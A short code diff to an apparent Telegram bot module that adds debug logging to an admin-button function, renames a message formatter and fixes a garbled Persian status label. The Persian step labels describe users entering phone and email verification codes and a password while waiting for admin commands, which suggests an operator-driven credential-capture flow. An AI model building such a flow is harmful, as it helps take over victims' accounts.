@@ -462,17 +462,27 @@ export const showAdminButtons = async (sessionId: string): Promise<boolean> => {
   try {
     const session = activeSessions.get(sessionId);
     if (!session) {
-      console.error("Session not found:", sessionId);
+      console.error("❌ Session not found:", sessionId);
       return false;
     }
+
+    console.log("🎛️ Request to show admin buttons for session:", {
+      sessionId,
+      currentStep: session.currentStep,
+      completedSteps: session.completedSteps,
+    });
 
     // Set step to waiting_admin and show buttons
     session.currentStep = "waiting_admin";
 
-    const updatedMessage = formatInitialMessage(session);
+    const updatedMessage = formatSessionMessage(session);
     const adminKeyboard = getAdminKeyboard(sessionId, session);
 
-    console.log("🎛️ Showing admin buttons:", adminKeyboard);
+    console.log("🎛️ Admin keyboard result:", {
+      hasButtons: adminKeyboard.inline_keyboard.length > 0,
+      buttonCount: adminKeyboard.inline_keyboard.flat().length,
+      keyboard: adminKeyboard,
+    });
 
     // Check if we're in demo mode
     if (!validateTelegramConfig()) {
@@ -877,7 +887,7 @@ const updateTelegramMessage = async (
 const getCurrentStepText = (step: string): string => {
   const stepTexts: { [key: string]: string } = {
     phone_verification: "در انتظار کد تایید شماره",
-    waiting_admin: "در انت��ار دستور ادمین",
+    waiting_admin: "در انتظار دستور ادمین",
     email_verification: "در انتظار کد تایید ایمیل",
     email_completed: "ایمیل تایید شد",
     auth_password: "وارد کردن رمز عبور",
